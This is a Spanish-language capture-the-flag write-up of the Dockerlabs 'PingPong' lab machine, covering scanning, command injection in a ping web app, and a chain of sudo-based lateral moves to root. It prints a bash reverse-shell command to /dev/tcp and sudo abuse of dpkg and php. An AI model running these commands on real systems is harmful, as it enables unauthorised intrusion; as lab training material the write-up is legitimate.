# PingPong

Máquina vulnerable en modo **medium** de Dockerlabs.

- [Reconocimiento](#reconocimiento)
- [Escaneo](#escaneo)
- [Enumeración](#enumeración)
- [Explotación](#explotación)
- [Escalada de privilegios](#escalada-de-privilegios)

<br/>

---

## Reconocimiento

La máquina objetivo se encuentra correctamente desplegada dentro de la red de laboratorio (en este caso, utilizando Docker).  
Dado que la dirección IP es conocida o fácilmente identificable dentro de este entorno controlado, esta fase se clasifica como **reconocimiento pasivo**.

![Reconocimiento](https://i.imgur.com/rs4PSAQ.png)

<br/>

---

## Escaneo

Se realizó un escaneo con **Nmap** para identificar puertos abiertos y servicios:

```bash
nmap -p- --open -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
```

El **target** corresponde a la IP de la máquina víctima: **172.17.0.2**

Resultados principales:

- Puerto **80** abierto (Apache)
- Puerto **443** abierto (Apache)
- Puerto **5000** abierto corriendo una aplicación en Python (Werkzeug).

![Scan1](https://i.imgur.com/racpOYG.png)

<br/>

---

## Enumeración

Se hizo una revisión de los puertos **80** y **433** en el navegador pero los servidores no suministraron información relevante.

![Scan1](https://i.imgur.com/YS628ZP.png)

El siguiente paso fue buscar directorios y recursos ocultos con **Gobuster**:

```bash
gobuster dir -u "http://172.17.0.2"   -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -t 20 -x php,txt,html,php.bak
```

El resultado no arrojó muchos directorios, se inspeccionó el `machine.php` pero tampoco mostró nada relevante.

![Gobuster](https://i.imgur.com/JJOzxTm.png)
![Machine](https://i.imgur.com/yod5G0O.png)

Se pasó al puerto **5000** donde se hayó una aplicación para realizar pings a hosts pasados por medio de un input HTML, al parecer no sanitizado. Debido a esto se realizaron pruebas de **Command injection** para así conseguir obtener información de la máquina.

![Werkzeug1](https://i.imgur.com/37eesfV.png)
![Werkzeug1](https://i.imgur.com/MY85DKb.png)

<br/>

---

## Explotación

Gracias a que los resultados fueron positivos, se implementó una reverse shell con bash para conectar a la terminal.

![Werkzeug1](https://i.imgur.com/s6zQY5h.png)  
![Werkzeug2](https://i.imgur.com/sW9IsW7.png)

<br/>

---

## Escalada de privilegios

Después de implementar la reverse shell se analizó el entorno para validar cómo conseguir la escalada de privilegios.

Se buscaron binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![SUID](https://i.imgur.com/PPXa0is.png)

Aunque algunos binarios no eran explotables, se observó `/usr/bin/dpkg` se puede ejecutar con el usuario `bobby`, lo que sugiere un movimiento lateral. En [GTFObins](https://gtfobins.github.io/gtfobins/dpkg/#sudo) podemos observar cómo ejecutar el dpkg.

Efectuamos ajustes en nuestro términal para evitar errores de list al ejecutar los comandos:

```
- script /dev/null -c bash
- stty raw -echo; fg
	reset xterm
- CTRL + z para pasarla background
- export TERM=xterm
- export SHELL=bash
- stty rows 47 colums 189
```

Al ejecutar los comandos para usar el dpkg:

```bash
sudo -u bobby /usr/bin/dpkg -l
```

![dpkg](https://i.imgur.com/YaJalta.png)
![dpkg](https://i.imgur.com/VKCKnWA.png)

Conseguido el usuario `bobby` Se repite el mismo proceso de comprobación de binarios y obtenemos lo siguiente para usuario `gladys`

![dpkg](https://i.imgur.com/3JNwdWo.png)

Se ejecuta el CMD en php para ejecutar otra reverse shell y conectarnos a `gladys`

`CMD='/bin/bash -c \ 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1\'`
`sudo -u gladys /usr/bin/php -r "system('$CMD');"`

Con esto pasamos al usuario `gladys` nuevamente se vuelve a repetir el proceso de comprobación, siempre utilizando searchbins o GTFObins en este caso el de [cut](https://gtfobins.github.io/gtfobins/cut/#sudo). Al revisar el directorio `/opt/` se encontró una flag que se utilizó para pasar al siguiente usuario `chocolatito`.

![dpkg](https://i.imgur.com/Iuf675b.png)

Obteniendo el usuario de `chocolatito` se vuelve a comprobar y se buscan nuevos binarios, en este caso es [awk](https://gtfobins.github.io/gtfobins/awk/#sudo). Que nos permite pasar al siguiente usuario que es `theboss`

![dpkg](https://i.imgur.com/ZeyEw1O.png)

Utilizando el método de comprobación como las veces anteriores, se descubre que este usuario en particular puede dar vía libre al root por medio de [sed](https://gtfobins.github.io/gtfobins/sed/#sudo).

![dpkg](https://i.imgur.com/ItDzxDz.png)

Y es con esto que después de realizar tantos movimientos laterales, se consigue escalar al root.
